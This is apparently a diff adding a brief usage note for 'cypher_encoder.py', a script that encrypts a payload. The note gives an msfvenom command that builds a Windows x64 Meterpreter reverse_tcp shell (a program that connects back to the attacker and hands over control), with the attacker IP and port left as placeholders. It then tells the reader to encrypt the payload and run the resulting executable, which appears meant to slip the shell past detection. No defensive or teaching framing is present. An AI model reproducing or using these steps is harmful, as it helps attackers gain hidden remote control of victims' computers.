@@ -1,0 +1,7 @@
+Usage: python cypher_encoder.py input.bin payload.enc   
+input.bin, this is the binary format of your payload, youre to only change the input.bin
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP ADDY LPORT=PORT -f raw > goons.bin
+Payload creation for kali Linux, its important that its x64
+
+create the payload first, encrypt with  python code and run the executable file 
